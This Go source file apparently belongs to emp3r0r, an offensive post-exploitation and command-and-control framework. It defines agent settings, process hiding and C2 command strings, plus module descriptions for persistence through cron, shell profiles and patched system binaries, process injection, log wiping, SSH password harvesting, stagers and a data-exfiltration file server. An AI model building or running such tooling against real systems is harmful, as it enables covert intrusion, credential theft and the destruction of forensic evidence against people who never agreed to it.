package emp3r0r_data

import (
	"context"
	"fmt"
	"net/http"
	"os"
	"strconv"

	"github.com/jaypipes/ghw"
	"github.com/posener/h2conn"
	"github.com/txthinking/socks5"
)

var (
	// OneTimeMagicBytes as separator/password
	OneTimeMagicBytes = []byte("6byKQ3Hcidum0NCdvJGK0w==")

	// Transport what transport is this agent using? (HTTP2 / CDN / TOR)
	Transport = "HTTP2"

	// HTTPClient handles agent's http communication
	HTTPClient *http.Client

	// CCMsgConn the connection to CC, for JSON message-based communication
	CCMsgConn *h2conn.Conn

	// KCPKeep: when disconnected from C2, KCP client should be notified
	KCPKeep = true

	// ProxyServer Socks5 proxy listening on agent
	ProxyServer *socks5.Server

	// HIDE_PIDS all the processes
	HIDE_PIDS = []string{strconv.Itoa(os.Getpid())}

	// GuardianShellcode inject into a process to gain persistence
	GuardianShellcode = `[persistence_shellcode]`

	// GuardianAgentPath where the agent binary is stored
	GuardianAgentPath = "[persistence_agent_path]"

	// will be updated by ReadJSONConfig
	// in form https://host:port
	CCAddress    = ""
	DefaultShell = ""

	// AESKey generated from Tag -> md5sum, type: []byte
	AESKey []byte
)

// Build
var (
	// to be updated by DirSetup
	Stub_Linux          = ""
	Stub_Windows        = ""
	Stub_Windows_DLL    = ""
	Packer_Stub         = ""
	Packer_Stub_Windows = ""
)

const (
	// Magic String
	MagicString = "06c1ae26-8b34-11ed-9866-000c29d9ff59"

	// Version hardcoded version string
	// see https://github.com/googleapis/release-please/blob/f398bdffdae69772c61a82cd7158cca3478c2110/src/updaters/generic.ts#L30
	Version = "v1.48.2" // x-release-please-version

	// RShellBufSize buffer size of reverse shell stream
	RShellBufSize = 128

	// ProxyBufSize buffer size of port fwd
	ProxyBufSize = 1024

	// Unknown
	Unknown = "Unknown"
)

// built-in module names
const (
	ModGenAgent     = "gen_agent"
	ModCMD_EXEC     = "cmd_exec"
	ModCLEAN_LOG    = "clean_log"
	ModLPE_SUGGEST  = "lpe_suggest"
	ModPERSISTENCE  = "get_persistence"
	ModPROXY        = "run_proxy"
	ModPORT_FWD     = "port_fwd"
	ModSHELL        = "interactive_shell"
	ModVACCINE      = "vaccine"
	ModINJECTOR     = "injector"
	ModBring2CC     = "bring2cc"
	ModStager       = "stager"
	ModListener     = "listener"
	ModSSHHarvester = "ssh_harvester"
	ModFileServer   = "file_server"
	ModDownloader   = "file_downloader"
	ModMemDump      = "mem_dump"
)

// PersistMethods CC calls one of these methods to get persistence, or all of them at once
var PersistMethods = map[string]string{
	"profiles": "Add some aliases to shell profiles, will trigger when user logs in",
	"cron":     "Add a cronjob",
	"patcher":  "Patch binaries (ls, ps, pstree, sshd, bash, sh...) so they load loader.so on startup, it also make emp3r0r essentially invisible to those tools",
}

var InjectorMethods = map[string]string{
	"shellcode":      "Inject shellcode (see wiki), if no shellcode is specified, it will inject guardian.asm (runs emp3r0r as child process)",
	"shared_library": "Inject a shared library, if no library is specified, it will inject loader.so (ELF loader that runs emp3r0r agent)",
}

// ModConfig stores module config data
type ModConfig struct {
	Name          string `json:"name"`        // Display as this name
	Exec          string `json:"exec"`        // Run this executable file
	InMemory      bool   `json:"in_memory"`   // run this module in memory (for now ps1 is supported)
	Type          string `json:"type"`        // "go", "python", "powershell", "bash", "exe", "elf", "dll", "so"
	Platform      string `json:"platform"`    // targeting which OS? Linux/Windows
	IsInteractive bool   `json:"interactive"` // whether run as a shell or not, eg. python, bettercap
	Author        string `json:"author"`      // by whom
	Date          string `json:"date"`        // when did you write it
	Comment       string `json:"comment"`     // describe your module in one line
	Path          string `json:"path"`        // where is this module stored? eg. ~/.emp3r0r/modules

	// option: [value, help]
	// eg.
	// "option you see in emp3r0r console": ["a parameter of your module", "describe how to use this parameter"]
	Options map[string][]string `json:"options"`
}

// Module help info and options
var Modules = map[string]*ModConfig{
	ModVACCINE: {
		Name:          ModVACCINE,
		Exec:          "built-in",
		Type:          "go",
		Platform:      "Linux",
		IsInteractive: false,
		Author:        "jm33-ng",
		Date:          "2020-01-25",
		Comment:       "Install tools to RuntimeConfig.UtilsPath, for lateral movement",
		Options: map[string][]string{
			"download_addr": {"Download address, useful if you want to download from other agents, use `file_server` first, eg. 10.1.1.1:8000"},
		},
	},
	ModGenAgent: {
		Name:          ModGenAgent,
		Exec:          "built-in",
		Type:          "go",
		Platform:      "Generic",
		IsInteractive: false,
		Author:        "jm33-ng",
		Date:          "2020-01-25",
		Comment:       "Build agent for different OS/arch with customized options",
		Options: map[string][]string{
			"os":                {"Target OS, available OS: linux, windows, dll"},
			"arch":              {"Target architecture, available arch: amd64, 386, arm, arm64, etc"},
			"cc_host":           {"CC host (IP/domain name)"},
			"cc_indicator":      {"Agents will check this URL before making connection to CC server, eg. https://github.com/xxx/xxx/releases/download/xxx/xx.txt"},
			"indicator_text":    {"Text to check, eg. emp3r0r"},
			"ncsi":              {"Use NCSI (Network Connectivity Status Indicator) to check internet access"},
			"cdn_proxy":         {"Use CDN as C2 transport, eg. wss://yourcdn.com/yourpath"},
			"shadowsocks":       {"Use shadowsocks as C2 transport, KCP (fast UDP tunnel) is enabled by default"},
			"c2transport_proxy": {"Use a proxy for C2 transport, eg. socks5://127.0.0.1:9050"},
			"auto_proxy":        {"Use auto proxy server: enable UDP broadcast to form a Shadowsocks proxy chain to automatically bring agents to CC"},
			"autoproxy_timeout": {"Auto proxy timeout in seconds"},
			"doh_server":        {"Use DNS over HTTPS (DoH) for DNS, eg. https://1.1.1.1/dns-query"},
		},
	},
	ModCMD_EXEC: {
		Name:          ModCMD_EXEC,
		Exec:          "built-in",
		Type:          "go",
		Platform:      "Generic",
		IsInteractive: false,
		Author:        "jm33-ng",
		Date:          "2020-01-25",
		Comment:       "Run a single command on one or more targets",
		Options: map[string][]string{
			"cmd_to_exec": {"Press TAB for some hints"},
		},
	},
	ModCLEAN_LOG: {
		Name:          ModCLEAN_LOG,
		Exec:          "built-in",
		Type:          "go",
		Platform:      "Linux",
		IsInteractive: false,
		Author:        "jm33-ng",
		Date:          "2020-01-25",
		Comment:       "Delete lines containing keyword from xtmp logs",
		Options: map[string][]string{
			"keyword": {"Delete all log entries containing this keyword"},
		},
	},
	ModLPE_SUGGEST: {
		Name:          ModLPE_SUGGEST,
		Exec:          "built-in",
		Type:          "go",
		Platform:      "Generic",
		IsInteractive: false,
		Author:        "jm33-ng",
		Date:          "2020-01-25",
		Comment:       "Run linux-smart-enumeration or linux exploit suggester",
		Options: map[string][]string{
			"lpe_helper": {"Which LPE helper to use, available helpers: lpe_les (Linux exploit suggester), lpe_lse (Linux smart enumeration), lpe_linpeas (PEASS-ng, works on Linux), lpe_winpeas (PEASS-ng, works on Windows"},
		},
	},
	ModPERSISTENCE: {
		Name:          ModPERSISTENCE,
		Exec:          "built-in",
		Type:          "go",
		Platform:      "Linux",
		IsInteractive: false,
		Author:        "jm33-ng",
		Date:          "2020-01-25",
		Comment:       "Get persistence via built-in methods",
		Options: map[string][]string{
			"method": {fmt.Sprintf("Persistence method: profiles: %s; cron: %s; patcher: %s", PersistMethods["profiles"], PersistMethods["cron"], PersistMethods["patcher"])},
		},
	},
	ModPROXY: {
		Name:          ModPROXY,
		Exec:          "built-in",
		Type:          "go",
		Platform:      "Generic",
		IsInteractive: false,
		Author:        "jm33-ng",
		Date:          "2020-01-25",
		Comment:       "Start a socks proxy on target host",
		Options: map[string][]string{
			"port":   {"Port of our local proxy server"},
			"status": {"Turn proxy on/off"},
		},
	},
	ModPORT_FWD: {
		Name:          ModPORT_FWD,
		Exec:          "built-in",
		Type:          "go",
		Platform:      "Generic",
		IsInteractive: false,
		Author:        "jm33-ng",
		Date:          "2020-01-25",
		Comment:       "Port mapping from agent to CC",
		Options: map[string][]string{
			"to":          {"Address:Port (to forward to) on agent/CC side"},
			"listen_port": {"Listen port on CC/agent side"},
			"switch":      {"Turn port mapping on/off, or use `reverse` mapping"},
			"protocol":    {"Forward to TCP or UDP port on agent side"},
		},
	},
	ModSHELL: {
		Name:          ModSHELL,
		Exec:          "built-in",
		Type:          "go",
		Platform:      "Generic",
		IsInteractive: true,
		Author:        "jm33-ng",
		Date:          "2020-01-25",
		Comment:       "Bring your own shell program to run on target",
		Options: map[string][]string{
			"shell": {"Shell program to run, eg. /bin/bash. Please use `elvish` module or upload a custom shell for opsec reasons. Default `bash` shell can be installed via module `vaccine`"},
			"args":  {"Command line args of the shell program"},
			"port":  {"The (sshd) port that our shell will be using"},
		},
	},
	ModINJECTOR: {
		Name:          ModINJECTOR,
		Exec:          "built-in",
		Type:          "go",
		Platform:      "Linux",
		IsInteractive: false,
		Author:        "jm33-ng",
		Date:          "2020-01-25",
		Comment:       "Inject shellcode/loader.so into a running process",
		Options: map[string][]string{
			"pid":    {"Target process PID, set to 0 to start a new process (sleep)"},
			"method": {fmt.Sprintf("Injection method, available methods: shellcode: %s; shared_library: %s", InjectorMethods["shellcode"], InjectorMethods["shared_library"])},
		},
	},
	ModBring2CC: {
		Name:          ModBring2CC,
		Exec:          "built-in",
		Type:          "go",
		Platform:      "Generic",
		IsInteractive: false,
		Author:        "jm33-ng",
		Date:          "2020-01-25",
		Comment:       "Bring arbitrary agent to CC",
		Options: map[string][]string{
			"addr": {"Target host to proxy, we will connect to it and proxy it out"},
		},
	},
	ModStager: {
		Name:          ModStager,
		Exec:          "built-in",
		Type:          "go",
		Platform:      "Generic",
		IsInteractive: false,
		Author:        "jm33-ng",
		Date:          "2020-01-25",
		Comment:       "Generate a stager for staged payload delivering",
		Options: map[string][]string{
			"type":       {"Stager format, eg. bash script"},
			"agent_path": {"Path to the agent binary that will be downloaded and executed on target hosts"},
		},
	},
	ModListener: {
		Name:          ModListener,
		Exec:          "built-in",
		Type:          "go",
		Platform:      "Generic",
		IsInteractive: false,
		Author:        "jm33-ng",
		Date:          "2020-01-25",
		Comment:       "Start a listener to serve stagers or regular files",
		Options: map[string][]string{
			"payload":  {"The payload to serve, eg. ./stager"},
			"listener": {"Listener type, eg. http_bare, http_aes_compressed"},
			"port":     {"Port to listen on, eg. 8080"},
		},
	},
	ModSSHHarvester: {
		Name:          ModSSHHarvester,
		Exec:          "built-in",
		Type:          "go",
		Platform:      "Linux",
		IsInteractive: false,
		Author:        "jm33-ng",
		Date:          "2020-01-25",
		Comment:       "Harvest clear-text password automatically from OpenSSH server process",
	},
	ModFileServer: {
		Name:          ModFileServer,
		Exec:          "built-in",
		Type:          "go",
		Platform:      "Generic",
		IsInteractive: false,
		Author:        "jm33-ng",
		Date:          "2020-01-25",
		Comment:       "Start a secure file server on target host for data exfiltration and module file caching",
		Options: map[string][]string{
			"port":   {"Port to listen on"},
			"switch": {"Turn file server on/off"},
		},
	},
	ModDownloader: {
		Name:          ModDownloader,
		Exec:          "built-in",
		Type:          "go",
		Platform:      "Generic",
		IsInteractive: false,
		Author:        "jm33-ng",
		Date:          "2020-01-25",
		Comment:       "Download and decrypt a file from other agents, run `file_server` first",
		Options: map[string][]string{
			"download_addr": {"Download address, eg 10.1.1.1:8000"},
			"path":          {"Path to the file (on server) to download, eg. /tmp/agent.exe"},
			"checksum":      {"SHA256 checksum of the file, used to verify integrity, wont't check if empty"},
		},
	},
	ModMemDump: {
		Name:          ModMemDump,
		Exec:          "built-in",
		Type:          "go",
		Platform:      "Generic",
		IsInteractive: false,
		Author:        "jm33-ng",
		Date:          "2020-01-25",
		Comment:       "Dump memory regions of a process",
		Options: map[string][]string{
			"pid": {"PID of the target process"},
		},
	},
}

// C2Commands
const (
	C2CmdCleanLog       = "!clean_log"
	C2CmdUpdateAgent    = "!upgrade_agent"
	C2CmdGetRoot        = "!get_root"
	C2CmdPersistence    = "!persistence"
	C2CmdCustomModule   = "!custom_module"
	C2CmdInject         = "!inject"
	C2CmdUtils          = "!utils"
	C2CmdDeletePortFwd  = "!delete_portfwd"
	C2CmdPortFwd        = "!port_fwd"
	C2CmdProxy          = "!proxy"
	C2CmdSSHD           = "!sshd"
	C2CmdSSHHarvester   = "!ssh_harvester"
	C2CmdLPE            = "!lpe"
	C2CmdBring2CC       = "!" + ModBring2CC
	C2CmdStat           = "!stat"
	C2CmdListener       = "!listener"
	C2CmdFileServer     = "!file_server"
	C2CmdFileDownloader = "!file_downloader"
	C2CmdMemDump        = "!mem_dump"
)

// AgentSystemInfo agent properties
type AgentSystemInfo struct {
	Tag         string           `json:"Tag"`          // identifier of the agent
	Name        string           `json:"Name"`         // short name of the agent
	Version     string           `json:"Version"`      // agent version
	Transport   string           `json:"Transport"`    // transport the agent uses (HTTP2 / CDN / TOR)
	Hostname    string           `json:"Hostname"`     // Hostname and machine ID
	Hardware    string           `json:"Hardware"`     // machine details and hypervisor
	Container   string           `json:"Container"`    // container tech (if any)
	CPU         string           `json:"CPU"`          // CPU info
	GPU         string           `json:"GPU"`          // GPU info
	Mem         string           `json:"Mem"`          // memory size
	OS          string           `json:"OS"`           // OS name and version
	GOOS        string           `json:"GOOS"`         // runtime.GOOS
	Kernel      string           `json:"Kernel"`       // kernel release
	Arch        string           `json:"Arch"`         // kernel architecture
	From        string           `json:"From"`         // where the agent is coming from, usually a public IP, or 127.0.0.1
	IPs         []string         `json:"IPs"`          // IPs that are found on target's NICs
	ARP         []string         `json:"ARP"`          // ARP table
	User        string           `json:"User"`         // user account info
	HasRoot     bool             `json:"HasRoot"`      // is agent run as root?
	HasTor      bool             `json:"HasTor"`       // is agent from Tor?
	HasInternet bool             `json:"HasInternet"`  // has internet access?
	NCSIEnabled bool             `json:"NCSI_Enabled"` // NCSI (or similar services) enabled
	Process     *AgentProcess    `json:"Process"`      // agent's process
	Exes        []string         `json:"Exes"`         // executables found in agent's $PATH
	Product     *ghw.ProductInfo `json:"Product"`      // product info
}

// AgentProcess process info of our agent
type AgentProcess struct {
	PID     int    `json:"PID"`     // pid
	PPID    int    `json:"PPID"`    // parent PID
	Cmdline string `json:"Cmdline"` // process name and command line args
	Parent  string `json:"Parent"`  // parent process name and cmd line args
}

// MsgTunData data to send in the tunnel
type MsgTunData struct {
	Payload string `json:"payload"` // payload
	Tag     string `json:"tag"`     // tag of the agent
	Time    string `json:"time"`    // timestamp
}

// H2Conn add context to h2conn.Conn
type H2Conn struct {
	Conn   *h2conn.Conn
	Ctx    context.Context
	Cancel context.CancelFunc
}

var CommonFilenames = []string{
	"monthlybanner",
	"is",
	"calendar",
	"close",
	"shared",
	"index",
	"auto",
	"notify",
	"status",
	"announcements",
	"v2",
	"apr",
	"entertainment",
	"government",
	"func",
	"ofbiz",
	"cgi-sys",
	"l",
	"events",
	"party",
	"code",
	"exchange",
	"wysiwyg",
	"java-plugin",
	"compliance",
	"pipe",
	"var",
	"font",
	"shopper",
	"a",
	"de",
	"word",
	"bb",
	"LICENSE",
	"sp",
	"webdav",
	"post",
	"promo",
	"certificate",
	"robots",
	"MANIFEST.MF",
	"health",
	"urls",
	"appl",
	"openjpa",
	"int",
	"todo",
	"staticpages",
	"deleted",
	"6",
	"opinion",
	"lg",
	"x",
	"staging",
	"isapi",
	"newticket",
	"~test",
	"google",
	"edp",
	"2",
	"~logs",
	"fuckoff",
	"keep",
	"cmd",
	"crons",
	"large",
	"students",
	"pool",
	"text",
	"vector",
	"thumbs",
	"tests",
	"overview",
	"posts",
	"webstats",
	"performance",
	"viewsource",
	"known_hosts",
	"topics",
	"gprs",
	"crossdomain",
	"2000",
	"presentation",
	"ssh",
	"conferences",
	".htpasswd",
	"Documents",
	"unreg",
	"query",
	"dialogs",
	"~bin",
	"wwwthreads",
	"reg",
	"_vti_bin",
	"8",
	"tpl",
	"wap",
	".passwd",
	"hacking",
	"1997",
	"configs",
}
